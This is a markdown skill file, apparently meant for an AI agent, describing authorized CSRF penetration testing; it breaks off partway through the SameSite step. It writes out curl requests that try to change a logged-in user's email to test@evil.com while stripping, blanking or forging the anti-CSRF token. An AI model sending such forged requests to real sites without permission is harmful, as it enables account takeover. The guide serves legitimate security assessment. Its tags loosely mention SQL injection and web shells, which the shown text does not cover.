---
name: performing-csrf-attack-simulation
description: "Test web applications for Cross-Site Request Forgery vulnerabilities. Signals: web vulnerability, injection, sql injection."
zh-signals: "Testing web applications for Cross-Site Request Forgery vulnerabilities 信号:web漏洞,注入,sql注入。"
when-to-use: Testing web applications for Cross-Site Request Forgery vulnerabilities
  by crafting forged requests that exploit authenticated user sessions during authorized
  security assessments.
domain: cybersecurity
subdomain: web-application-security
tags:
- penetration-testing
- csrf
- owasp
- web-security
- session-management
- burpsuite
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
mitre_attack:
- T1190
- T1059.007
- T1505.003
- T1083
---

# Performing CSRF Attack Simulation

## When to Use

- During authorized web application penetration tests to identify state-changing actions vulnerable to CSRF
- When testing the effectiveness of anti-CSRF token implementations
- For validating SameSite cookie attribute enforcement across different browsers
- When assessing applications that perform sensitive operations (password change, fund transfer, settings modification)
- During security audits of custom authentication and session management mechanisms

## Prerequisites

- **Authorization**: Written penetration testing agreement for the target
- **Burp Suite Professional**: With CSRF PoC generator functionality
- **Web server**: Local HTTP server for hosting CSRF PoC pages (Python `http.server`)
- **Two browsers**: One authenticated as victim, one as attacker
- **Target application**: Authenticated session with valid test credentials
- **HTML/JavaScript knowledge**: For crafting custom CSRF payloads


> **Legal Notice:** This skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## Workflow

### Step 1: Identify State-Changing Requests

Browse the application and identify all POST/PUT/DELETE requests that modify server-side state.

```
# In Burp Suite, review Proxy > HTTP History
# Filter for POST/PUT/DELETE methods
# Focus on actions like:
# - Password/email change
# - Fund/money transfers
# - Account settings modifications
# - Adding/removing users or permissions
# - Creating/deleting resources
# - Toggling security features (2FA disable)

# Example state-changing request captured in Burp:
POST /api/account/change-email HTTP/1.1
Host: target.example.com
Cookie: session=abc123def456
Content-Type: application/x-www-form-urlencoded

email=newemail@example.com

# Check for anti-CSRF protections:
# - CSRF tokens in form fields or headers
# - Custom headers (X-CSRF-Token, X-Requested-With)
# - SameSite cookie attribute
# - Referer/Origin header validation
```

### Step 2: Analyze Anti-CSRF Token Implementation

Test the strength and enforcement of any CSRF protections present.

```bash
# Check if CSRF token is present
curl -s -b "session=abc123" \
  "https://target.example.com/account/settings" | \
  grep -i "csrf\|token\|_token"

# Test 1: Remove the CSRF token entirely
curl -s -X POST \
  -b "session=abc123" \
  -d "email=test@evil.com" \
  "https://target.example.com/api/account/change-email" \
  -w "%{http_code}"

# Test 2: Send empty CSRF token
curl -s -X POST \
  -b "session=abc123" \
  -d "email=test@evil.com&csrf_token=" \
  "https://target.example.com/api/account/change-email" \
  -w "%{http_code}"

# Test 3: Use a random/invalid CSRF token
curl -s -X POST \
  -b "session=abc123" \
  -d "email=test@evil.com&csrf_token=AAAAAAAAAA" \
  "https://target.example.com/api/account/change-email" \
  -w "%{http_code}"

# Test 4: Reuse an expired/old CSRF token
curl -s -X POST \
  -b "session=abc123" \
  -d "email=test@evil.com&csrf_token=previously_captured_token" \
  "https://target.example.com/api/account/change-email" \
  -w "%{http_code}"

# Test 5: Use User B's CSRF token with User A's session
curl -s -X POST \
  -b "session=user_a_session" \
  -d "email=test@evil.com&csrf_token=user_b_csrf_token" \
  "https://target.example.com/api/account/change-email" \
  -w "%{http_code}"
```

### Step 3: Check SameSite Cookie and Header Protections

Verify browser-level and header-based CSRF defenses.

```bash
# Check SameSite attribute on session cookies
curl -s -I "https://target.example.com/login" | grep -i "set-cookie"
# Look for: SameSite=Strict, SameSite=Lax, or SameSite=None

# SameSite=Lax allows CSRF on top-level GET navigations
# SameSite=None; Secure allows cross-site requests
# No SameSite attribute: browser defaults to Lax (modern browsers)

# Check for Origin/Referer header validation

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
